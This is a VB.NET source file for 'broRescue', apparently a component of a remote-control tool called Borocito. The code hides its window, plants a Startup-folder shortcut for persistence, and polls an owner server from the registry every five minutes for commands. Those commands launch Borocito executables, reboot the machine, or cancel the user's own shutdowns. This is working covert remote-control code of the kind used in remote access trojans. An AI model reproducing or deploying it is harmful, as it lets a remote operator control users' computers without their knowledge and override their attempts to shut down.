Imports System.Runtime.InteropServices
Imports Microsoft.Win32
Public Class Init
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
    Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
    Dim UID As String
    Dim threadReader As Threading.Thread
    Dim AFKTime As UInteger
    Dim lastCommand As String
    Dim HttpOwnerServer As String
    Dim NoShutdown As Boolean = False
    Private Sub Init_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Hide()
        Try
            LoadRegedit()
            StartWithWindows()
            CheckForIllegalCrossThreadCalls = False
            threadReader = New Threading.Thread(AddressOf ReadingCommand)
            threadReader.Start()
            INPUT.cbSize = Marshal.SizeOf(INPUT)
            ReadParameters(Command())
            Me.Hide()
        Catch ex As Exception
            Console.WriteLine("[Init_Load@Init]Error: " & ex.Message)
        End Try
        AddHandler Microsoft.Win32.SystemEvents.SessionEnding, AddressOf SessionEvent
    End Sub

    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                Dim args() As String = parameter.Split(" ")

                If args(0).ToLower = "/getafk" Then
                    BoroHearInterop(CheckInactivity())
                Else
                    ReadCommand(args(0))
                End If

            End If
        Catch ex As Exception
            Console.WriteLine("[ReadParameters@Init]Error: " & ex.Message)
        End Try
    End Sub

    Sub StartWithWindows()
        Try
            Dim StartupShortcut As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\broRescue.lnk"
            If My.Computer.FileSystem.FileExists(StartupShortcut) = False Then
                Dim WSHShell As Object = CreateObject("WScript.Shell")
                Dim Shortcut As Object = WSHShell.CreateShortcut(StartupShortcut)
                Shortcut.IconLocation = Application.ExecutablePath & ",0"
                Shortcut.TargetPath = Application.ExecutablePath
                Shortcut.WindowStyle = 1
                Shortcut.Description = "Rescue software for Borocito"
                Shortcut.Save()
            End If
        Catch ex As Exception
            Console.WriteLine("[StartWithWindows@Init]Error: " & ex.Message)
        End Try
    End Sub

    Sub ReadingCommand()
        Try
            While True
                Dim LocalCommandFile As String = DIRHome & "\[" & UID & "]broRescue.str"
                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
                End If
                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
                Dim filePath As String = DIRHome & "\[" & UID & "]broRescue.str"
                Dim commandOne As String = IO.File.ReadAllLines(filePath)(1).Split(">"c)(1).Trim()
                If commandOne <> Nothing Then
                    If lastCommand <> commandOne Then
                        If commandOne.StartsWith("broRescue") Then
                            ReadCommand(commandOne)
                            lastCommand = commandOne
                        End If
                    End If
                End If
                Threading.Thread.Sleep(300000) '5 minutos
            End While
        Catch ex As Exception
            Console.WriteLine("[ReadingCommand@Init]Error: " & ex.Message)
        End Try
    End Sub
    Sub LoadRegedit()
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito", True)
            UID = regKey.GetValue("UID")
            HttpOwnerServer = "http://" & regKey.GetValue("OwnerServer")
            RegisterInstance()
        Catch ex As Exception
            Console.WriteLine("[LoadRegedit@Init]Error: " & ex.Message)
            End
        End Try
    End Sub
    Sub RegisterInstance()
        Try
            Dim llaveReg As String = "SOFTWARE\\Borocito\\boro-get\\" & My.Application.Info.AssemblyName
            Dim registerKey As RegistryKey = Registry.CurrentUser.OpenSubKey(llaveReg, True)
            If registerKey IsNot Nothing Then
                registerKey.SetValue("Version", My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")")
            End If
        Catch ex As Exception
            Console.WriteLine("[RegisterInstance@Init]Error: " & ex.Message)
        End Try
    End Sub
    Sub ReadCommand(ByVal command As String)
        Try
            If command.Contains("Borocito") Then
                Process.Start(DIRCommons & "\Borocito.exe")
            ElseIf command.Contains("Extractor") Then
                Process.Start(DIRCommons & "\BorocitoExtractor.exe")
            ElseIf command.Contains("Updater") Then
                Process.Start(DIRCommons & "\BorocitoUpdater.exe")
            ElseIf command.Contains("Restart") Then
                Process.Start("shutdown.exe", "/r")
            ElseIf command.Contains("NoShutdown") Then
                NoShutdown = True
            ElseIf command.Contains("YesShutdown") Then
                NoShutdown = False
            End If
        Catch ex As Exception
            Console.WriteLine("[ReadCommand@Init]Error: " & ex.Message)
        End Try
    End Sub

    Private Declare Function GetLastInputInfo Lib "user32" (ByRef plii As pLASTINPUTINFO) As Boolean
    Structure pLASTINPUTINFO
        Public cbSize As Integer
        Public dwTime As Integer
    End Structure
    Dim INPUT As New pLASTINPUTINFO()
    Function CheckInactivity() As UInteger
        Try
            GetLastInputInfo(INPUT)
            Dim TOTAL As Integer = Environment.TickCount
            Dim ULTIMO As Integer = INPUT.dwTime
            Dim INTERVALO As Integer = (TOTAL - ULTIMO) / 1000
            Return INTERVALO
        Catch ex As Exception
            Return "[CheckInactivity@Init]Error: " & ex.Message
        End Try
    End Function

    Sub SessionEvent(ByVal sender As Object, ByVal e As Microsoft.Win32.SessionEndingEventArgs)
        Try
            If e.Reason = Microsoft.Win32.SessionEndReasons.Logoff Then
                Console.WriteLine("[SessionEvent]User is logging off!")
            ElseIf e.Reason = Microsoft.Win32.SessionEndReasons.SystemShutdown Then
                Console.WriteLine("[SessionEvent]System is shutting down!")
            Else
                Console.WriteLine("[SessionEvent]Something happend!")
            End If
            If NoShutdown Then
                Process.Start("shutdown.exe", "/a")
            End If
        Catch ex As Exception
            Console.WriteLine("[SessionEvent]Error: " & ex.Message)
        End Try
    End Sub
    Function BoroHearInterop(Optional ByVal content As String = Nothing) As Boolean
        Try
            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get\\boro-hear", True)
            If regKey Is Nothing Then
                Return False
            Else
                Try
                    If content <> Nothing Then
                        'AddToLog("BoroHearInterop", content, False)
                        Process.Start(regKey.GetValue("boro-hear"), content)
                    End If
                    Return True
                Catch
                    Return False
                End Try
            End If
        Catch ex As Exception
            Console.WriteLine("[BoroHearInterop@Init]Error: " & ex.Message)
            Return False
        End Try
    End Function
End Class